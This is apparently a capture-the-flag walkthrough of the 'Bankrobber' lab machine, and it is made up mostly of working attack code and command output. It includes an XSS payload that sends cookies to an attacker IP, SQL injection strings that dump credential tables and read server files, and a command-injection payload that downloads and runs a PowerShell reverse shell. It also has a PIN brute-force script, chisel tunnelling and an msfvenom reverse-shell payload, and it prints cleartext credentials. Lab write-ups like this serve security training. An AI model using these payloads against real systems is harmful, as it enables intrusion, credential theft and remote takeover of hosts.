### Nmap
```text
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http?        syn-ack
443/tcp  open  https?       syn-ack
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
| SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        syn-ack MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2022-11-14T04:57:35
|_  start_date: 2022-11-14T04:45:59
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26952/tcp): CLEAN (Timeout)
|   Check 2 (port 39393/tcp): CLEAN (Timeout)
|   Check 3 (port 52758/udp): CLEAN (Timeout)
|   Check 4 (port 61637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

### Web Enum
```bash
# firstly found user's cred will be stored in cookie with base64 encoded
# xss payload send to http://10.10.10.154/User comment box
<img src=x onerror="this.src='http://10.10.14.8:8888/?'+document.cookie; this.removeAttribute('onerror');">

# run listen
python2 XSS-cookie-stealer.py

# get admin cookie by xss from 
username                ['YWRtaW4=']
password                ['SG9wZWxlc3Nyb21hbnRpYw==']
id                      ['1']

# admin cred
admin:Hopelessromantic

# get use with admin interface
id:2 gio


# sqli confirm number of return rows
" 1' order by 3# "
" ' UNION SELECT 'a','b','c'# "

# found user and users table
" ' UNION SELECT group_concat(table_schema),group_concat(table_name),'c' from information_schema.tables# "

# get user cred
" ' UNION SELECT user,password,'c' from mysql.user# "
root:Welkom1!

# get user cred
" ' UNION SELECT username,password,'c' from users# "
admin:Hopelessromantic
gio:gio

# load local file
" ' UNION SELECT 'a',load_file('C:\\xampp\\htdocs\\index.php'),'c'# "

# read backdoorchecker.php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>
```

### Exploit get shell as cortin
```bash
# We can execute cmd from backdoorchecker.php but we can only send request from the target itself
# So we can utilise xss to run script from the target
#

# step1: craft javascript payload
var param = "cmd=dir"
var shell = "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.8/powercat.ps1');powercat -c 10.10.14.8 -p 443 -e cmd"
var payload = param+"|"+shell

var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/admin/backdoorchecker.php");
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(payload);

# step2: host payload on kali
sudo python3 -m http.server 8888

# step3: send xss payload to trigger reverse shell
<script src="http://10.10.14.8:8888/script.js"></script>

```

### Priv Esc
```bash
# tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
bankv2.exe                    1616                            0        220 K

# netstat -ano | findstr LISTENING
TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1616

# access service
.\nc64.exe 127.0.0.1 910

# port forwarding to bf pin
kali: chisel server -p 10000 --reverse
victim: .\chisel_windows_amd64.exe client 10.10.14.8:10000 R:910:127.0.0.1:910

# bf script -> pin:0021
import socket
import sys
for i in range(10000):
    sys.stdout.write(f"\rTrying: {i:04d}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 910))
    s.recv(4096)
    s.send(f"{i:04d}\n".encode())
    resp = s.recv(4096)
    if not b"Access denied" in resp:
        print(f"\rFound pin: {i:04d}")
        break
    s.close()

# found we can overwrite the running tool
nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] aiuefhwiujfbkiuwjbefiuhewiuhfwoi[reverse shell path goes here]
 [$] Transfering $aiuefhwiujfbkiuwjbefiuhewiuhfwoiqeuhfiouqwhfeiowubefiouqbweifubqweioufboqwieufboiqwuebfoiqwuebfiouwqe using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: qeuhfiouqwhfeiowubefiouqbweifubqweioufboqwieufboiqwuebfoiqwuebfiouwqe

# create payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -e x86/shikata_ga_nai -f exe -o reverse.exe

# trigger payload and get root shell
aiuefhwiujfbkiuwjbefiuhewiuhfwoiC:\Users\Cortin\Documents\reverse.exe

```
